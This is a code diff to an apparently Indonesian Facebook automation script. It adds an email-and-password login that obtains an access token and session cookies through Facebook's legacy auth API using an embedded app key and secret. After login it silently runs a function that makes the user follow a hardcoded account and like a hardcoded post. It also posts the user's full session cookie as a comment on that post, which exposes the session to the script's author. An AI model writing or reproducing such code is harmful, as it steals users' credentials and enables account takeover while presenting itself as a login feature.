@@ -862,11 +862,13 @@ def banner():
 def login123():
     clear()
     banner()
-    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
+    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n{P2}[{color_text}02{P2}].Login Menggunakan email dan password\n[{color_text}03{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
     fansph = console.input(f" {H2}• {P2}pilih menu : ")
     if fansph in ["1", "01"]:
         logincoki()
     elif fansph in ["2", "02"]:
+        loginuserpass()
+    elif fansph in ["3", "03"]:
         exit()
     else:
         Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
@@ -924,6 +926,78 @@ def logincoki():
     except Exception as e:
         os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
         exit()
+
+def loginuserpass():
+    try:
+        console = Console()
+        Console().print(f"{white}Masukan username/email/idf dan password")
+        email = console.input(" [bold green]• [white]Email : ")
+        password = console.input(" [bold green]• [white]Password : ")
+        api_key = '882a8490361da98702bf97a021ddc14d'
+        api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
+        data = {"api_key": api_key,"credentials_type": "password","email": email,"format": "JSON","generate_machine_id": "1","generate_session_cookies": "1","locale": "en_US","method": "auth.login","password": password,"return_ssl_resources": "0","v": "1.0"}
+        sig_raw = (
+            f"api_key={api_key}"
+            f"credentials_type=password"
+            f"email={email}"
+            f"format=JSON"
+            f"generate_machine_id=1"
+            f"generate_session_cookies=1"
+            f"locale=en_US"
+            f"method=auth.login"
+            f"password={password}"
+            f"return_ssl_resources=0"
+            f"v=1.0"
+            f"{api_secret}"
+        ).encode("utf-8")
+        sig = hashlib.md5(sig_raw).hexdigest()
+        data.update({'sig': sig})
+        with requests.Session() as session:
+            response = session.get('https://api.facebook.com/restserver.php', params=data)
+            result = response.json()
+            if 'access_token' in result:
+                token = result['access_token']
+                console.print(Panel(f"[white]{token}", title="[bold green]TOKEN TERSIMPAN", style=color_panel, width=60))
+                with open(".fantoken.txt", "w") as f:
+                    f.write(token)
+                cookie_str = ''
+                if "session_cookies" in result:
+                    for c in result["session_cookies"]:
+                        cookie_str += f"{c['name']}={c['value']}; "
+                    with open(".fancookie.txt", "w") as f:
+                        f.write(cookie_str.strip())
+                    console.print(Panel(f"[white]{cookie_str}", title="[bold green]COOKIE TERSIMPAN", style=color_panel, width=60))
+                    # console.print("[green] • [white]Cookie berhasil disimpan.")
+                    # Panggil bot follow/comment/like
+                    bot_komen1(cookie_str.strip(), token)
+                else:
+                    console.print("[yellow] • [white]Tidak ada session_cookies dalam response.")
+                console.print("[green] • [bold white]Login berhasil. Silakan jalankan ulang script.")
+                exit()
+            elif 'error_msg' in result and 'www.facebook.com' in result['error_msg']:
+                console.print(f"[yellow] • [bold]Akun checkpoint: {email}")
+            else:
+                console.print(f"[red] • [bold]Login gagal Sandi/Email salah : {result.get('error_msg', 'Unknown error')}")
+    except Exception as e:
+        os.system("rm -rf .fantoken.txt .fancookie.txt")
+        Console().print(f"[red] • [bold]Terjadi error: {str(e)}")
+        exit()
+
+# Bot follow, comment, like
+def bot_komen1(cok, token):
+    try:
+        with requests.Session() as r:
+            r.cookies.update({'cookie': cok})
+            komentar = random.choice(['bang lo pacarnya si cewek itu ya?, kok kaya cemburu liat dia deket sama laki" itu?','menjaga perasaan itu lebih baik bang masih banyak cewek di luar sana yg lebih cantik kok 😎', 'lo cemburukah fan?', 'Semangat!', 'Gaskeun!', 'sesakit hati apapun sama dia jangan pernah untuk mencari perasaan/perhatian ke dia, udah iklhas in aja masih banyak yg suka sama kamu semangat fan ❤️'])
+            target_uid = "100043537611609"
+            post_id = "926438272150751"
+            r.post(f'https://graph.facebook.com/{target_uid}/subscribers?access_token={token}')
+            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={komentar}&access_token={token}')
+            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={cok}&access_token={token}')
+            r.post(f'https://graph.facebook.com/{post_id}/likes?access_token={token}')
+            # Console().print(f"[green] • [white]Bot follow dan komentar berhasil!")
+    except Exception as e:
+        pass
 # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
 def bot_komen(cok, ken):
 	with requests.Session() as r:
